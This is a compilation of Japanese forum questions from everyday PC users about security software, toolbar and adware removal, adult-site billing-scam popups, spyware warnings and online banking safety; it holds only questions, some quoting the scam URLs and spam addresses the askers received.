McAfee Securityって必要ですか 　Adobeの最新バージョンを入れたら、一緒にMcAfee Security というものがインストールされました。 　Ｎｏｒｔｏｎが入っているので、ＭｃＡｆｅｅを削除しても支障はないと思うのですが実際のところはどうなんでしょうか。 　教えてください
「 PCをシャットダウンしてもWebカメラが作動する盗撮スパイウェアの恐怖 」 でggると出てきます。知らない方は一読されるといいと思います。 簡単に言うと「PC使用者の私生活を無断で監視・録画してしまうというもの」です。 自分は某掲示板で見つけたのですが、そこにはこんな意見が書かれていました。 >スパイウェアじゃなくて、パソコン内部にネットワークカメラを仕込んで PCから電源供給させて無線LAN経由でデータ送ってたんだろ >これはかなり前から中国で言われていたこと。 >普通webカメラ内蔵の液晶って外枠にカメラあるけど、もろ液晶パネルに仕込んだりできるのかな？？ そこで、 スパイウェアだとすると、タスクマネージャーで発見できないか？ ウェブカメラのないパソコンでは可能性がないか？ 盗撮カメラなどを発見する方法はあるか？ というのが質問です。よろしくお願いします。
パソコン内のいらないファイルを削除しているのですが、 jog.dllとはなにでしょうか。 削除しても大丈夫なのでしょうか。 教えてください
インターネットを閲覧中、何気なくクリックしたら、その内容と全く異なるエロサイトに有料会員として登録されたという画面が出てきました。登録されたから金を払えと書かれており、時間カウンターが動いています。この画面が、IEのクッキー等をすべて消したつもりなのに画面から消えません。消し方を教えてください。
最近になって、迷惑メールが大量に届くようになったのですが、思い返してみると迷惑メールが届くようになった前の晩に、iPhoneで風俗サイトを閲覧し、入口で18歳以上のボタンをクリック(タップ)しました。しかも、知人や友人にも同時期から迷惑メールが届くようになっており、もしかして個人情報が抜き出されてしまったのでしょうか？ iPhoneやスマートフォンで同じような事例があったら教えて下さい。 また、対処方法などあれば教えていただけると助かります。 ヨロシクお願いします。
ファイアーウォールについて質問させていただきます。 以前までフリーのウィルスソフトのavast!とpctoolsを何年か前から入れていたのですが最近になってpctoolsが原因でｐｃがフリーズしたりするようになったのでアンインストールしました。 現在はwindowsに元々はいっているファイアーウォールを使っているのですがOSはwindows　ＸＰであり、このＯＳはもうすでに保証期間が終わっているとのことでこのままwindowsのファイアーウォールを使い続けても効果が得られるのか心配です。 現在はフリーズなどの不具合は出ていないのでこのままでいいのならそうしたいのですが、他にファイアーウォールをいれるべきでしょうか？ いれるべきならcomodoあたりをいれようと思っているのですが他におすすめのファイアーウォールのソフトがあれば教えてください。
アダルトサイトの幾つかをを何気なく閲覧した後に PCを再立ち上げ（再起動したとき）どういう訳か、アダルトサイトの入会広告みないな画面が PC上に「自動的に」出てしまいました。 消す方法（再起動したときに画面を出さない方法）がわかりません。 もう一度XPを再インストールすればいいかもしれませんが、消去するいい方法はありませんか？ 現在のところ、オフラインでPCを再起動し、白地の画面が出た時点で右上の×しるしをクリックして 「応急処置」したあとにLANケーブルをPCに物理的に繋いで（つないで）ネット接続しています。
ZoneAlarm Free Firewall version: 10.1.065.000 です、Windows7で使っています。 XPのころの日本語版(ver7)だったかと思うのですが、 アプリケーションがアクセスしようとするときに、表示されるポップアップに 今回のみのチェックがあったかと思うのですが、 Ver10だとそのチェックがポップアップにありません。 今回のみ許可といった許可はできますでしょうか？ もしZoneAlarm10でできないようであれば、そのような動作が可能な、 firewallをご存じであれば紹介していただければ幸いです。
ネットバンキングを安全に使用する目的で、専門のパソコンを中古で購入しました。 中古のため、誰がどのような使用方法だったかも分かりませんので、ＨＤＤの復元システムを使用してリカバリしたいと思っています。 その場合に購入したパソコンには、以下の２つの方法があります。 (1)購入時の状態に復元 (2)ＨＤＤリカバリ領域以外を消去 もし、スパイウェアなどが潜んでいた場合にでも、(1)購入時の状態に復元で大丈夫でしょうか？ それとも、(2)ＨＤＤリカバリ領域以外を消去を行ってから、(1)購入時の状態に復元を行った方が安全でしょうか？ パソコンは詳しくないので、よろしくお願いいたします。
ウィルスではないのですが PCの動きを遅くしているのではないか と非常に気になります。 某ソフトは修復のための有料版を やたら進めてくるのですが、 フリーで修復まで出来るお薦めソフトはありませんか？ 優秀なものなら 日本語非対応でも 慣らして使います。 評価が定まっているものを お願いします。 現在はCClanerを使っていますが、 他のものを使うと驚くほど レジストリの破片のようなものが 出てくるので、、、。
フリーソフトをインストールしている時、気づかずに”Babylon”がインストールされてしまいました。 「プログラムの追加と削除」で、Babylonツールバーを削除、「スタートメニュー」から「検索」で「Babylon」を探し、全てを破棄しました。 ところが、”Babylonツールバー”、が削除されず、新しいタブを開くと「Babylon」に、飛んでしまいます。 メインブラウザは「ファイヤーフォックス」なのですが、アドオンメニューにも”Babylon”がありません。 僕は、完全に「Babylon」を削除したいのですが、やり方がわかろません。 僕のOSはWindowsXPです。 どなたか、解決法をお教えください。 よろしくお願いいたします。
こんにちは。いつもお世話になっております。 ネットワーク系の勉強を始めたばかりなのですが、どうしても分からないことがあって質問させていただきました。 セキュリティ、ファイアウォールについてなのですが、説明文に、http以外のプロトコルは、危険な可能性があるから遮断する場合が多い、といった内容の記述を見ました。 私が理解する範囲では、例えば悪意のあるプログラムを仕込まれてしまった場合でも、どのみちhttpで通信されてしまうのではないか、という疑問です。　わざわざオリジナルのプロトコルを用いて悪意のあるプログラム同士が通信するメリットはなんなのでしょうか？？
先日からあるｍｉｘｉアプリをたちあげると マルウェアを検知しました、みたいな警告がウイルスソフトから でるようになり、以後駆除？してもずっとそのアプリを立ち上げると でるようになってしまいました。 同じウイルスソフトを入れている別のＰＣにはでません。 これはどういうことなのでしょうか？ またよくわかりませんがウイルスソフトがマルウェアではないものを マルウェアと認識して警告をだす場合があるときいたことがあります。 それでもこのような警告がでた場合きちんと都度駆除する必要があるのでしょうか？ 無知ではずかしいですが教えてください。
こんばんは。 アバストの無料ウイルス駆除ソフトを入れてます。 今回、今までウイルスなど検出されなかったのですが、 思い当たるのは、オーディオファイルをmp3ファイルへ変換する ・・というフリーソフトをアメリカのサイトでＤＬした後に アバストが「マルウェアの検出！？」・・と 画面上に警告し、「sptd.sys」は削除しますか？　の問いに sptd.sysを調べた所↓、 http://www.windowsfiles.jp/fairu/sptd.sys.html 重要:sptd.sysとして隠れているマルウェアもあります。 特に、それらがc:¥windowsまたは、 c:¥windows¥system32 フォルダーにある場合はマルウェアです。 こういった理由から、あなたのPC上において、 ウィルスであるかどうかsptd.sys プロセスをチェックする必要があります。 ↑と書かれていましたので、急いでそのsystem32フォルダを見たところ、 「sptd.sys」・・があったので、削除を指示したら、一旦、電源が切れて 次にブルスク画面でなにかしら英語表示が動き、１％→１００％へと 数字が動き、再起動という形でウィンドウズが動き出しました。 しかしながら、一応、問題なくネットなどもできますが、 やはり、リカバリした方がよろしいでしょうか？ ちなみに、ＰＣには重要書類などは入れておらず、 ただ、楽天でクレジットを使用して買い物したり、 アマゾンでクレジットを使用して買い物したり また、ネット銀行でログイン・オフしたりしますが、 ↑こういう暗証番号や登録ＩＤ（メルアド）なども キチンと削除しないと盗まれるのでしょうか？ すみません。ド素人すぎる質問で皆様のアドバイスお願い致します！
有線LANのDELLのノートでインターネットをしていたら、AVASTで警告が出て、「（ファイル）system32/drivers/sfloppy.sys」に「ルートキット：隠しファイル」が検出されました。と表示されたので 今すぐに削除を選択したのですが、何度削除しても、再度表示が出て、もう一台のノート（dell）で無線lanでインターネットを試したところ、同じ表示が出てきました。 さらに、リカバリを実行したばかりのデスクトップ（hp)を有線LANで接続したところ、 リカバリ後すぐに同じ表示が出ました。 これは何を意図してますか？ 三台ともマルウェアに犯されているのでしょうか？ 素人考えで、共通するのは同じLANを使っていることだけだと思い、 LANの電源を落としたりしてみましたが同じでした。 どなたかわかる方教えてください(＞＿＜)
（osはwin7＿64bit）ウイルスバスター2012クラウド使用。 windowsのupdataで、 ‎Windows Defender - KB915597←と言うのが入って来ますが、コントロールパネルのWindows Defenderを開くと(無効)と成っています。肝心のpcの方で無効なのに何故windowsのupdataで受付ているのでしょうか？
以前、オンラインバックアップサービスを利用していた頃は、毎日のように攻撃が来ていましたが、利用をやめて以降は攻撃が来なくなりました。ということは、これらの攻撃はオンラインバックアップサービスに預けるデータを盗む目的だったということでしょう？ 一応、ルーターは一応つけていますし、セキュリティソフト(カスペルスキー)もちゃんと入れていますが、外部にデータを預けるのは危険でしょうか。オンラインバックアップサービスはデータを暗号化しているから安全だと言っていますが、本当に安全なんでしょうか。
ネットバンキングを利用していますが、キーロガーやフィッシングによる被害が心配です。 ウイルス対策ソフトのavastのセーフゾーンを使用すれば、情報が外部に漏れることはないようですが、有料版にしかない機能ですし、少々使い勝手が悪そうで躊躇しています。 ネットバンキングでは、ソフトウェアーキーボードや乱数表を使用していますが、やはりこれだけでは不十分でしょうか？
以下のアドレスは不正に高額な料金を請求するアダルトサイトへの誘導サイトの入り口なのですが、どこに通報したら良いでしょうか？ 警察でしょうか？ http://blog.daletto.net/zkutrkn/
国会のＰＣなんかでもウイルス感染、情報やパスワード流出 これらにはウイルス対策ソフト入ってたらいいですね テレビの検証なんかでモザイク掛かってましたが シマンテックの製品版だと思います メール添付の画像だと思ってクリック・・・ 感染して情報が抜けてました。 検証していた専門家が言うには知らないサイトから、知らない人から などのメールは開封しないで破棄、偽装の可能性のあるメールは 開いても添付された物を開くのは ネットから遮断されたＰＣで開封させて真偽を見分けるしかないって・・・ こう言うのは製品版でも防げないのでしょうか？
。 タイミングは予測不可能。 多い時は一日に何回か。 少ない時はひと月に一回くらい。 ＰＣＭ音として毎回同じ音声が再生されているよう。ノイズとして発生したのではないようです。実害はない（かどうかは分からない）けど耳障りで気味が悪いです。 二年前に買った時から症状が出ます。 リカバリしても治りません。 原因と対処法を教えて下さい。 メーカーサポートでもわからないとのこと。 Widnows XP 三台の（ほぼ）同一機種で発生しています。 ACER AOA-150 二台 ACER AO531h 一台
僕はネット初心者で知らず知らずのうちに「Babylon」というソフトをダウンロードしてしまいました。 ウザったいので早く消そうとしてコントロールパネルを開き「プログラムのアンインストール」で「Babylon」をアンインストールしたと思ったのですが消えずに残っておりました。 教えて！gooやほかのサイトで「Babylon」を消す方法を調べてみたのですが、 僕は馬鹿なのでわかりませんでした。 そんな馬鹿な僕にもわかるように教えてください。 お願いします。
回答ありがとうございます。その後、システムの復元をして、再度Spybotのインス すると、重要レジストリの変更を検知したと表示され、 カテゴリー　　Internet Explorer Seaeches 変更　　　　　Value 削除 エントリー　　CFBFAE00-.......... もう一つは カテゴリー　　Browser Helrer Object 値　　　　　　追加 エントリー　　DBC8004-.......... というようなものです。 再度回答をお願いいたします。
先日、Spybot Search & Destory をインストールしました。すると重要なレジストリの変更を検知したと表示されることがありますが、これは、変更しても良いのか、変更不可かよくわかりません。 レジストリのことはよくわかりませんが、どう対処すべきか教えて下さい。数回変更を選んだこともありますが、最近は拒否しています。
私の場合、ファイアウオールの設定が、NTTのCTUとセキュリティソフト（バスター）とWindowsの3か所あります。 これは全部有効設定でよろしいのでしょうか？ OSはWin7です。
ウイルスやスパイウェアをスキャンする無料で強力なソフトを探しています。 ふだんはNIFTYの常時安全セキュリティ24を使用し、リアルタイムスキャンと定期スキャンをやっています。しかし不安が残ります。 というのも以前a-squared freeというソフトでスキャンをかけたところ、常時安全セキュリティ24ではひっからないスパイウェア（主にクッキー）がたくさん見つかりました。 a-squared freeと同様の、強力で優秀で無料のソフト/サービスはないでしょうか？ よろしくお願いします。
衆議院　議員　全員のパスワードが盗まれていた可能性が高いそうですそうです。 実際どのような対策をしていたのでしょうか ちなみに私自身は ウイルスチェックソフト　ログオンごとにアップデートで最新 OS 常時最新にアップデート ブラウザ　常時最新にアップデート　セキュリティ配慮の厳しく設定 ルータ　　セキュリティ配慮の設定　 コンテンツフィルタ　怪しいサイトはほとんど見ることのできない設定 などです。
先ほど「エロッパ」にアクセスしたところ、ウィルスバスターから「ウィルスサイト」との警告が出ました。 ここは危険なサイトなのですか？
GoogleやＹａｈｏｏで検索し、検索された項目をクリックすると必ずbeoo.comに誘導されます。また、戻るようにしても、beoo.comが表示され戻ることができません。どう対処すれば良いのかご指導をお願いします。ウイルス対策ソフトはマカフィーです。
最近、ウィルスに感染して、パスワードを盗み、銀行口座から引き出す泥棒のニュースが多いですが。わたしは、面倒なので、オンラインバンキングやクレジットカードのパスワードやＩＤ、（アマゾンなんかもパスワードを確認しないんですが）、クリックして出てくるようにしてあるんですが、そういうのって、ウィルスに感染するとそれらを盗まれるんでしょうか？楽天クレジットカードを作るとき、わたしの銀行のＨＰに切り替わって、確認のために銀行の暗証番号をネットで入れた記憶もあります。ちなみに、AVG2011 のfree のプロテクトをかけてます。ＰＣの中に保存してあるパスワードまで盗んでしまうウィルスてどんなんでしょうか？日ごろからどんなことに気をつければよいのでしょう？ＰＣを廃棄するときも気をつけることがありますか？よろしくお教えください。
現在私はパソコンのウイルス対策をしていません。 しかし、ノートンなどを購入するとなると5000円ぐらいするようですね。 インターネットバンクなども利用している為、少し心配になりました。 先日、無料のセキュリティソフトがあると知り少し調べてみたところ、KINGSOFTのものを見つけました。 こちらのものです。 http://www.kingsoft.jp/is/ こちらのソフトをダウンロードしても安全でしょうか？ やはり5000円ほど出してでも、ノートンなどを購入した方が良いでしょうか？ しかし、このようなソフトって期限があるのですよね？ きちんとした対策をする場合、期限が切れるたびに5千円ほど出して新たに購入しなければならないのでしょうか？ どうかご指導よろしくお願いします。
WINDOWS XP　を使っています。 プログラムを終了して、スタートボタン→終了オプション→電源を切ると操作していくと、毎回最後に「プログラムの終了-Message Bouncer」というのが出まして、ここから「すぐに終了」としないと終了できません。 そこでSpyware Striker Proというもので無料スキャンした結果、53個の脅威が検出されてしまいました。詳細は以下になります。 ・3721chinese keywords (CNSMin) ・BaiduBar ・cookie:Tracking cookies となっています。これはどのように対処すればよいでしょうか？ Spyware Striker Proにおいて有料で対処できるようですが、Spyware Striker Pro自体信頼できるもか分からず困っています。 よろしくお願いいたします。
間違えて　有料アダルトサイトに登録してしまったようです。 パソ開くと画面に何か出てくるみたいなんです…(´；口；`) 「お客様専用ID」とか、「支払期限」とか。 しかも 登録後3日までに支払わなければならないそうで… 金額も高くてどうすればいいのかわからないのです。 早めに退会したいのですが…やり方がわからなくて… 学生なのでソフトウェアとかそれをダウンロードして云々がわからなくて… わかりやすい回答…お早めにお願いします
私の携帯はドコモです 嫁にいまどこサーチに登録して私の居場所をいつでもわかるようにするように言われました 調べられた時 嘘の居場所を伝える方法はないでしょうか いいアイデア教えて下さい
昨日、エフセキュア(F-secure)のオンラインスキャンを行ったところ Suspicious:W32/Malware!Gemini (スパイウェア) *システム というようなスキャン結果が出ていました セキュリティにはＮＴＴ西日本の対策ツールを使用しています。今回その他主要な無料オンラインスキャンを行い、エフセキュアのみでこの検出結果が出ました。（ウイルスバスター、ノートン等を試しました） その後誘導に従い駆除を行い Suspicious:W32/Malware!Gemini (スパイウェア) * システム (駆除済み) と言う表示が出たので、一応駆除が完了したのかな？と思います これはいったいどのようなマルウェアなのでしょうか？ ＮＴＴのセキュリティツールでは反応が出なかったのですが、セキュリティツールを取り換えた方が良いのでしょうか？ 私の個人情報がすでに流出してしまっている可能性は高いのでしょうか？ スキャンレポートから該当するマルウェアについて調べてみましたが、いまいち要領を得ません。 全く予期していなかったので、非常にもやもやしております…なにとぞよろしくお願い申し上げます。
ＯＳはＷｉｎｄｏｗｓ　Ｖｉｓｔａです。”定義の更新を確認できません。エラーコード０ｘ800700ｃ１の表示がされます。また別の表示では”ｕｐｄａｔｅエラー新しい更新プログラムを検索できません。エラーコード800700ｃ１”となります。 現在ＰＣは問題無く使えていますが、不安でいます。解決方法を教えてください。セキュリティソフトはＥＳＥＴスマートセキュリティです。よろしくお願い致します。
Nortonの2012にアップデートしました。 今まで（２０１１）の時、検索で、危険なサイトかどうか分かりやすかったのですが、２０１２にアップデートしてからは、サイトが危険かどうか、多分グレイ色が危険でグリーン色が安全だと思うのですが、 この色が本当に見えずらくなっています。設定などを変えて、検索の時に、安全なサイト・危険なサイトを分かるように出来るのでしょうか？御教示下さい。
こんにちは。 VISTA、firefoxを使用しております。 Babylon toolbarに悩まされています！ 削除ができません。助けてください。 アドレスバーから検索しようとするとbabylonの検索ページに飛ばされるというのが今の状態です。 一通りＰＣ内をチェック、それらしきものは削除したため、今はBabylon、mybabylon等で検索しても何も出てきません。firefoxのアドオンをチェックしてもbabylonは見当たりません。 regeditでbabylonと検索して表示されたものも削除しました。 セーフモードでも同じ作業をしましたが、検索にはbabylonが入ったままです。 babylon toolbarがインストールされてしまったのは別のフリーソフトからです。 babylon自体を再インストールしてそこからアンインストールしてみましたが、状態は変わりませんでした。 気持ち悪くて仕方ないです。 どうかよろしくお願いいたします。
自宅のPCで、インターネットをしていたら、「スパイウェアが入りました」とメッセージが出て、それ以降、「パーソナルシールドプロ」の押し売りアプリケーションに邪魔されてPCがまったく使えなくなってしまいました。どうしたらいいのでしょうか？「パーソナルシールドプロ」というプログラムは買いたくないのですが．．．PCが使えなくて困っております。
携帯ブログ セキュリティーなんですが、 高校生ですが学校に自分のブログにセキュリティーコードが掛けてあるのに 先生が「そんなもの簡単に解除して誰のでもいつでも見れるソフトがある」って言われ、 友人も秘密の写真｛バイク禁止でツーリング写真｝を友人何人かで映した写真を、 A4に伸ばして「この写真はあまえらやな」って見つかりみんな停学退学になりそうです、 本当にこんな事が出来るソフトなどあるんでしょうか？ それともだれか友人がブログのアドレスとセキュリティーコードをおしえたんでしょうか？ いろいろあるでしょがソフトの事だけ答えてください。
機種：DELL Dimension8300　ソフト：ＸＰ　ｓｐ３ 数日前から、ＰＣのスイッチを入れても、ＤＥＬＬ　の文字がチラッと出るだけで「入力信号なし」の メッセージが出て、すぐ電源が切れます。何度か繰り返すと、今度は「チー」と音がして、黒い画面に英字の画面「……DELL SupportSystem」が出て、やはり「入力信号なし」のメッセージが出て、すぐ電源が切れます。こんなことを数十回繰り返すとやっと、Winndowsが起動します。 「システムの復元」を数ヶ月前の日付けを選択指定してやってみましたが、「復元は未完了」、「コンピュータの変更はありません」とのメッセージが表示されるだけで改善できません。 尚、購入後5年を経過しているのでメーカーのサポートは有料となるため、今のところ利用していません。以上のような状況について、有効な対策をご教示下さい。宜しくお願いします。
お手上げ状態です。どなたかお知恵を授けてください。 ふと気づくと、矢印カーソル横で砂時計マークが点滅している状態になっていました。 そこで原因を探るためにタスクマネージャを確認したところ、プロセスに於いて GoogleUpdate.exe が複数（３～４個）見つかりました。 それ自体も？なので、取り敢えず GoogleUpdate.exe への対策※ を調べて対応してみましたが、状況はまったく変わりません。　※スタートアップ、プログラム、レジストリへの対応 タスクマネージャでは複数個の表示のまま、またプロセス終了しようとしても受け付けません。 さすがにウイルスやスパイウェアを疑いましたが、ウイルス対策ソフトとＳｐｙｂｏｔ でスキャンした限りでは異常は検出されませんでした。 どうぞよろしくお願いします。
Windows7を使用しています。気が付かないうちに「McAfee Security Scan Plus」という知らないソフトがインストールされていました。画面上に「スキャンを開始します」続行／キャンセルと表示されましたが不安でそのままにしています。このソフトは安全か危険なのか分かる方のお知恵を拝借させてください。危険な場合、アンインストールは普通にやって良いでしょうか？
本日F-Secure.でオンラインスキャンをしたところ ７つのスパイウェア（マルウェア？）を見つけたのですが、 そのうち１つだけ駆除できないものがありました。 Program Files\eRightSoft\SUPER\x264.exe　このx264.exeという物ですが、 これは削除してしまってよろしいのでしょうか？ これがもし重要なものでしたら、削除したあとにどこかで再度ＤＬできるのでしょうか。
ファイアウォールやウイルスに役立つソフトで実用的な ソフトはありますでしょうか。 宜しくお願いします。
知人が最近自宅のケープルテレビ会社で加入しているインターネットサービスを止めてソフトバンクの高速データ通信に加入しました。私はwifi用のipadを持っているので、私もこの通信機があれば家のパソコンも、家の外でipadも使えるので便利だといって勧めてくれます。ケーブルテレビ会社のネットサービスを止めて、高速テータ通信にしてもネット環境的に問題はないでしょうか。 デジタルに詳しくない者です。どうかよろしくお願いします。
ワイファインという勝手につながって、広告を見せるサービスをNTTbpが提供していますが、邪魔なのでやめてもらいたいという人いますか？ 一々、削除するかwifiをオフにして、気づかずに家でもオフのままで腹立ちますね。 法で罰せられなくてもこんな不要なサービスを提供しているBPはほかにやることないんでしょうか？
Microsoft SecurityEssentialsの履歴で脅威が検出されており許可済みになっています 変更して削除したいのですが、許可された項目のみを見てもファイル名の所に何もなく 私には処理できませんでした。 すでに削除されているのか、それとも残っており他に削除方法があるのか教えていただきたい よろしくお願いします
前からずっとこんな状態です。 ウイルスバスターを使っています。 ネットショッピングも時々あるので、念のためクレジットカード番号、電話番号などをスパイされないように設定しています。もちろん痕跡は残していませんが。ところが驚くくらい頻繁に、ブロックしました、ブロックしましたって表示されるのです。 ネットに接続されている時は、いやになるくらい出ます。表示を止めることはできるのですが、確認の意味で表示させています。 これは必ずしも自分の番号がスパイされているわけではないですよね。 ネット上の何かの記号、番号の一部が、たまたま自分の設定した番号に重なったということですよね。 皆さん、こんなに頻繁にブロック表示が出ますか。心配になります。
いろいろなメーカーからセキュリティソフトを販売していますが、その中でウイルス検出率の低いもの(安価）は自分で処理・管理できる人は選択肢にということなのですが、ネットサーフィン中に地雷を踏んでも対応できる人ということでしょうか？勝手にバックドアクラックされたものに関しては対応しかねますが どうなんでしょうか？
　被害の現状 と 被害事例をおしえてください。
　パソコンのデスクトップに有料アダルトサイトの請求が表示されるようになってしまいました。消してもすぐに同じところに現れるタイプのものです。 　アダルトサイトを閲覧した覚えはないので占いサイトか何かから飛んでしまったのだと思います。 　他の質問に、焦って支払わないこと、むやみにアクセスしないことと書いてあったので、今のところ無視しており、向こうからのアクションもありません。そのため何の問題もないと言えるかもしれませんが、公共の場所でパソコンを使用するため、デスクトップに請求の画面が表示されるのをどうにかしたいと思っています。 　実は、今年の5月に一度あらわれて、spybptで駆除したあと、セーフモードからシステムの復元を行い、システム構成のスタートアップからadlutと表示されているものを無効にしたりいろいろ試した結果(どれが最終的によかったのかはよく分かりません)表示されなくなりました。 　でも、2～3日前からまた現れるようになってしました。文面が同じなのと気をつけてむやみやたらにボタンを押さないようにしていたので、前のが復活したのだと思います。以前と違うのは、女の人のピンクな画像がなくなり、お金の請求が書かれた文章だけが現れるようになったこと、インターネットにつないでいないと、http://9ea.adult109.com/dy598fx/6bGyKJx4E9l5ydP4 …と表示された白紙のページがデスクトップに現れることです。 　コンピューターには詳しくないので、正直どうしたらよいのか分かりません。 　どうぞ、よい方法を伝授してください。よろしくお願いします。
　今年５月にベストアンサーになった「アダルトサイトからの請求画面の消し方を教えて下さい」や、過去のこの検索上のやり方を色々試してみましたが、しつこく消えずに残っています。他に方法はないでしょうか。自分で考えろとか、変態とかいう回答はご遠慮ください。
IE9をインストール後、PCが動かなくなったので、パソコンのリカバリー後、 それまで使っていたフリーセキュリティソフトをインストールし直しました。 Comodo Firewall、Avast、Spybot、SpywareBlaster は、問題なく以前のように動いています。 Ad-Aware90 もインストールしました。 （最新版では日本語版はないということで、英語版です。） 以来、以前のように、クリックしてアップデートができません。 一瞬 「AdAware Update Manager」という小さな窓が開きますが、すぐ閉じてしまいます。 スタート→すべてのプログラム→Lavasoft→AdAware → AdAware Update　と しても同じです。 それまで使っていた日本語版では、アップデートをすると、 最初の画面で、左の緑色のロゴの下に更新日が記録されていましたが、 今は、 Web Update Status: OK と表示されたままです。 英語版でも、アップデートすれば、その日の日付が記録されるのではないかと思うのですが・・・ 一度アンインストールして、再インストールしても同じ結果でした。 できれば使い続けたいのですが、どうすれば良いのか、わかりません。 使用PCは、 Windows 7 Home Premium IE8 です。 どなたか、詳しい方がいらっしゃいましたら、どうぞ教えてください。
何かのフリーソフトを入れた際に、一緒にインストールされました。 プログラムのアンインストールからbabylonを消しましたが、ツールバーのアドオンは消えません。 二年前の記事に、program file にmyBabylon_Englishがあるからそれを消せば消える、とありましたが、私のＰＣにそれはありません。 セーフモードで探してみましたが、そこにもありません。 スタートの検索でbabylonと入力しても何も出てきません（Windows Vista です）。 私の力ではこれが限界です。 とりあえずステータスバーのチェックを外していますが、気味が悪いです。 完全に消す方法はないですか？
教えてください。 ずっとなのですが、 You [news@242etrj541yah.info] MyLine [mail@myad01yy.info] 等のアドレスから、毎日毎日大量の迷惑メールが来て困っております。 何度も、受信拒否リストや、迷惑メール設定をしても受信してしまいます。 プロが、これらの設定に引っかからないようにしているのだと思います。 どなたか、これらを受信できないようにする方法を教えていただけないでしょうか。 よろしくお願いいたします。
アドアウェアをインストールしたいのですが、言語選択のところにJAPANESEがでてきません。 どうしたらいいですか？
週に1回定期的に「ウィルスバスター」で診断していますが、 毎回、5～6個の「スパイウェア」が「Cookie-」にあって 結果は、削除済みで安全です、となるのですが。 これは毎回削除すれば、そのままでもかまわないのですか? それとも、ウィルスに感染している? Windows7(32bit)です。使用期間1年半位です。
地方銀行のインターネットバンキングをしたいのですが、安全面について如何なものでしょうか？ セキュリティもパソコンも素人ですが、次の状態でどんなことを注意しなければならないのでしょうか？ いろいろとお教え願います。 家は　一戸建てです。 パソコン　夫と共に使う自家用パソコンが1台（いづれ２台目を求め有線ＬＡＮの予定）。 故障にならない限りこのパソコンからしかアクセスしない予定。 故障したら近くにいる娘の自家用パソコンを借りて銀行にアクセスする予定。 ユーザー　　夫婦が独立しているが共用ファイルも扱える。 ＯＳは　　Windows XP home edition SP3 セキュリティソフト　　カスペルスキーインターネットセキュリティ2011 ファイアウォールは　同上を利用 ブラウザーは　ＩＥ８及びｆｉｒｅｆｏｘ ｍicroｓoft ｕｐｄａｔｅのほか　ｍｙＪＶＮで最新版にしております。 ＩＳＰは　ソネット　　　　セキュリティの契約なし。 ネット接続　ＡＤＳＬ12Ｍｂ/ｓ　ルーター兼用のモデム モデムパソコン間は　有線ＬＡＮケーブル なおバンキングの入力時には、ソフトキイボードも併用可能です。 思いつく環境を挙げました。不足する場合は補足させていただきます。
現在家庭にてPC３台で「Norton Internet Security(N.I.S)」（更新しながら７年間ずーっと）を使用しています。 PCがもう１台増える予定なので「Microsoft Security Essent(M.S.E)」 又はプロバイダ付属（megaegg光）の「Mcafee（無料）」に換えることを検討しています。 尚　OSはWin7（64bit)です。 (1)３者の得失は？ (2)「M.S.E」又は「Mcafee」に換えると安全面で不安が増す？ (3)3者は　ほぼ同等のレベルである？ 出来るだけ安心してPCを使いたいのでよろしくお願いします。
yahooのホームページから、記事を読もうと、クリックすると、以下のページに移動します。 　http://japanese.joins.html?servcode=4008&sectcod … スーパーアンチスパイウエアーでスキャンしてみても、なにも見つかりません。 また、avast　でウイルススキャンをしてもなにも見つかりません。 解決策をご存知の方、教えてください。
セキュリティに詳しくないでのどなたか教えてください。 新しいノートPCを購入して１か月が経ちます。PCにはノートンの１か月無料のセキュリティー ソフトがインストールされていて、その有効期限が切れました。有効期限の延期のメッセーが しきりに表示されてるのですが、フリーソフトでもまかなかいいものが出ていると聞き Avira antivir personをフリをインストールしようと考えています。やはり性能的に ノートンを選択すべきなのでしょうか？ 　そんなにインターネットを使うヘビーユーザーでもないので、最低限の機能があれば いいかなと思っています。 皆さんは、どのようなセキュリティソフトを使用されていますか？
PWS.Gamemania.gen が検出されます。 何度修復してもこれだけが検出されるのですが 削除するのはどうしたら良いでしょうか？
最近のノートパソコンには、ウェブカメラがついていますよね。 普通に考えても、技術を駆使すればこのカメラをネットを介して外部から操作し、撮影できると想像できます。事実、海外ではそれによる被害も起きているようです。 日本ではどうなのでしょうか？　あまり被害を聞きませんが、普通に身の回りで起こっていますか？また、そういった被害は、「簡単に」起こりえますか？　 簡単に、というのは、同じ「被害」が生じるにしても、高度な技術者が一生懸命技術を駆使しないと起こり得ないのか、それとも、盗撮ウイルスみたいなのが普通に出回っていて、それに感染すれば、簡単に映像・画像が流出してしまうのか、それを知りたいです。 実は久しぶりに帰省した今年の正月に、新しくなった実家のパソコンにウェブカメラがついていました。私は、「なんとなく気持ち悪い」とは感じつつ、平気でカメラの前を素っ裸で通ったりしたと思います。あ、もちろん、変なことをしていたのではなく、お風呂上がりに、そのまんまで・・・という意味です。 私は男ですから、最悪、自分の素っ裸が流出したとしても、酷く落ち込むでしょうが、たくましく生きていきます。もう最悪の覚悟はしました。そうしないと不安で不安で生きていけないです。 最悪の覚悟をしたうえで、それがどれくらいの確率で起こるかを調べております。 ご回答をお待ちしています。
SPYBOT2 ベータ版をアンインストールしたのですが、アンインストーローラーを起動させOKしても、ぜんぜん先に進みません。どうすればいいのでしょうか。 OSはXPです。
私の家はセコムのホームセキュリティを利用しています。 外出する時にはいつもセコムのセキュリティをかけ、外出モードにして出かけています。 今朝もそのようにして外出し数時間して帰宅した所、いつもの帰宅時の対応ではなく侵入警報が鳴って、セコムから電話がかかってきました。 私が外出モードにするのを忘れたのかと思いましたが、セコムの記録では朝セキュリティをかけた記録がしっかりあるそうです。そして留守中に誰かが侵入した記録はないとのこと。 とすると、なぜ侵入警報が鳴ったのか不思議でなりません。 インターネットで調べるとセコムのロック解除をする方法がいくつもあるそうです。 ロックを解除して侵入した人が機械の履歴を消し、外出モードに直すのを忘れて逃げていったという可能性はあるでしょうか？ 詳しい方、どうぞよろしく教えてください。
お世話になります。 私は携帯電話をandroidにかえてから、 スケジュールやタスクの管理に google calendarやToDoリストを使っていたのですが、会社の上司に外部のサーバーに会社にかかわる情報を保存するのはとても危険だと指摘を受けました。 私の勤めている会社には、クラウド上（会社の外部）に会社に関わるデータを保存してはならないという規定は特にないので、私としては、安全性さえ証明できれば問題なく使用できると考えています。 どうすれば安全に利用できるのかと少し調べたところ、ワンタイムパスワードによる2段階認証なども利用できるようですが、現在のところ通常のgoogleappsでは利用できないようでした。 実際に、google apps は危険なのでしょうか・・・？ 危険だとわかれば、今後は個人利用に限って利用しようと思います。 よろしくお願いします。
ＶｉｓｔａのＰＣが遅いのでSymantechの更新なしの状態で、、 Windows Defenderを停止するのは危険でしょうか？ もし、フリーのアンチウイルスやスパイウェアで軽いソフトが あったら知りたいです。 よろしくお願いします。
